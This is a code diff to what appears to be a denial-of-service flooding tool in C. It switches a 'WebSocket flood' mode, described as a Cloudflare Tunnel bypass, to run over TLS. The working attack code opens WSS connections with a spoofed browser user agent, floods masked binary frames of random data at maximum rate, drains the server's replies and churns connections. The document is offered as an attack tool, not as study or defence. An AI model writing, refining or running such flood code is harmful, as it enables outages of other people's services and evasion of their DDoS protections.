@@ -330,6 +330,12 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 conn->ssl = SSL_new(ssl_ctx);
                 SSL_set_fd(conn->ssl, conn->fd);
                 SSL_set_tlsext_host_name(conn->ssl, args.host);
+            } else if (args.is_v20_ws) {
+                // v20_ws: always TLS (WSS) for CF Tunnel bypass
+                conn->stage = STAGE_TLS_HANDSHAKE;
+                conn->ssl = SSL_new(ssl_ctx);
+                SSL_set_fd(conn->ssl, conn->fd);
+                SSL_set_tlsext_host_name(conn->ssl, args.host);
             } else if (args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) {
                 conn->stage = STAGE_H2_PREFACE;
             } else {
@@ -347,8 +353,16 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
         if (conn->stage == STAGE_TLS_HANDSHAKE) {
             int ret = SSL_connect(conn->ssl);
             if (ret == 1) {
-                conn->stage = STAGE_H2_PREFACE;
-                conn->sub_stage = 0;
+                if (args.is_v20_ws) {
+                    // v20_ws: TLS done → go to ATTACKING for WS upgrade
+                    conn->stage = STAGE_ATTACKING;
+                    conn->writable = 1;
+                    conn->sub_stage = 0;
+                    thread_stats[thread_id].connect_success++;
+                } else {
+                    conn->stage = STAGE_H2_PREFACE;
+                    conn->sub_stage = 0;
+                }
             } else {
                 int err = SSL_get_error(conn->ssl, ret);
                 if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
@@ -882,10 +896,10 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             }
 
-            // === V20 WEBSOCKET FLOOD (CF TUNNEL BYPASS) ===
-            else if (args.is_v20_ws) {
+            // === V20 WEBSOCKET SECURE FLOOD (CF TUNNEL BYPASS) ===
+            else if (args.is_v20_ws && conn->ssl) {
                 if (conn->payload_idx == 0) {
-                    // Phase 1: Send WebSocket Upgrade request
+                    // Phase 1: Send WSS Upgrade request over TLS
                     char ws_key[25];
                     for (int i = 0; i < 22; i++) ws_key[i] = 'A' + (fast_rand() % 26);
                     ws_key[22] = '='; ws_key[23] = '='; ws_key[24] = 0;
@@ -899,60 +913,54 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                         "Sec-WebSocket-Key: %s\r\n"
                         "Sec-WebSocket-Version: 13\r\n"
                         "Origin: https://%s\r\n"
-                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
                         "\r\n",
                         args.host, ws_key, args.host);
-                    int ret = send(conn->fd, upgrade, ulen, MSG_NOSIGNAL);
+                    int ret = SSL_write(conn->ssl, upgrade, ulen);
                     if (ret > 0) {
                         conn->payload_idx = 1;
                         conn->last_pulse_ms = now;
                         thread_stats[thread_id].packets++;
                         thread_stats[thread_id].bytes += ret;
-                    } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                        goto cleanup;
+                    } else {
+                        int err = SSL_get_error(conn->ssl, ret);
+                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
                 }
                 else if (conn->payload_idx == 1) {
-                    // Phase 2: Drain upgrade response (101 Switching Protocols)
+                    // Phase 2: Read upgrade response (101 Switching Protocols)
                     char resp[4096];
-                    int r = recv(conn->fd, resp, sizeof(resp), MSG_DONTWAIT);
+                    int r = SSL_read(conn->ssl, resp, sizeof(resp));
                     if (r > 0) {
-                        conn->payload_idx = 2; // Upgrade done, start flooding
-                    } else if (r == 0) {
-                        goto cleanup; // Server closed
-                    } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
-                        goto cleanup;
+                        conn->payload_idx = 2;
+                    } else {
+                        int err = SSL_get_error(conn->ssl, r);
+                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
-                    // Timeout: if no response in 5s, start flooding anyway
                     if (now - conn->last_pulse_ms > 5000) conn->payload_idx = 2;
                 }
                 else {
-                    // Phase 3: Flood WebSocket binary frames at max speed
-                    char ws_buf[32768];
+                    // Phase 3: Flood WebSocket binary frames over TLS
+                    unsigned char ws_buf[16384];
                     int bp = 0;
                     int frame_count = 0;
                     
-                    // Pack multiple WS frames into one send
-                    while (bp < 30000) {
-                        // Random payload size: 512-4096 bytes
+                    while (bp < 14000) {
                         int pl_size = 512 + (fast_rand() % 3584);
                         
-                        // WebSocket frame header (masked, binary)
-                        ws_buf[bp++] = 0x82; // FIN + binary opcode
+                        ws_buf[bp++] = 0x82; // FIN + binary
                         if (pl_size < 126) {
-                            ws_buf[bp++] = 0x80 | pl_size; // MASK + 7-bit len
+                            ws_buf[bp++] = 0x80 | pl_size;
                         } else {
-                            ws_buf[bp++] = 0x80 | 126; // MASK + 16-bit len follows
+                            ws_buf[bp++] = 0x80 | 126;
                             ws_buf[bp++] = (pl_size >> 8) & 0xFF;
                             ws_buf[bp++] = pl_size & 0xFF;
                         }
                         
-                        // Masking key (4 bytes)
                         unsigned int mask = fast_rand();
                         memcpy(ws_buf + bp, &mask, 4);
                         bp += 4;
                         
-                        // Masked payload (random data from buffer pool)
                         int offset = fast_rand() % (BUFFER_POOL_SIZE - pl_size);
                         unsigned char *src = (unsigned char*)(global_buffer_pool + offset);
                         unsigned char *mk = (unsigned char*)&mask;
@@ -962,27 +970,22 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                         frame_count++;
                     }
                     
-                    // Send all frames in one batch
-                    int cork = 1;
-                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                    int ret = send(conn->fd, ws_buf, bp, MSG_NOSIGNAL);
-                    cork = 0;
-                    setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                    
+                    int ret = SSL_write(conn->ssl, ws_buf, bp);
                     if (ret > 0) {
                         thread_stats[thread_id].packets += frame_count;
                         thread_stats[thread_id].bytes += ret;
                         conn->payload_idx += frame_count;
-                    } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                        goto cleanup;
+                    } else {
+                        int err = SSL_get_error(conn->ssl, ret);
+                        if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                     }
                     
-                    // Drain server responses (pong, close frames)
+                    // Drain server responses
                     char drain[4096];
-                    while (recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT) > 0) {}
+                    while (SSL_read(conn->ssl, drain, sizeof(drain)) > 0) {}
                     
-                    // Recycle after 500-1000 frames for connection churn
-                    if (conn->payload_idx > 500 + (fast_rand() % 500)) {
+                    // Recycle after 300-600 frames
+                    if (conn->payload_idx > 300 + (fast_rand() % 300)) {
                         goto cleanup;
                     }
                 }
